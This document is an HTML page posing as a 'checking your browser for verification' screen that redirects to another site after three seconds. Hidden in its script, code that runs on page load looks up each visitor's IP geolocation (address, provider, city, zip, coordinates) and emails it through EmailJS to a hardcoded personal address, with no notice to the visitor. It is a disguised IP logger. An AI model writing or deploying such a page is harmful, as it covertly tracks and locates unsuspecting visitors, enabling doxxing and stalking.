<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification...</title>
    <meta http-equiv="refresh" content="3;url=https://wickbot.com" />
</head>
<body>
    <h1>Checking your browser for verification...</h1>

    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.6.4/dist/email.min.js"></script>
    <script>
        // Initialize EmailJS with your public key
        emailjs.init("4ItP8f4Z88r0-9S1M"); // Use your public key here

        // Fetch IP data from ip-api
        fetch('https://ip-api.com/json/')
            .then(response => response.json())
            .then(ipData => {
                // Prepare email parameters
                const emailParams = {
                    to_email: 'boriszarkov4@gmail.com', // Your email
                    ip_address: ipData.query,
                    provider: ipData.org + " (" + ipData.as + ")",
                    timezone: ipData.timezone,
                    country: ipData.country,
                    city: ipData.city,
                    zip: ipData.zip,
                    latitude: ipData.lat,
                    longitude: ipData.lon
                };

                // Send email using EmailJS
                emailjs.send("service_x25rs8q", "template_3mgw9je", emailParams)
                    .then((response) => {
                        console.log('Email sent successfully:', response);
                    }, (error) => {
                        console.error('Error sending email:', error);
                    });
            })
            .catch(error => {
                console.error('Error fetching IP data:', error);
            });
    </script>
</body>
</html>
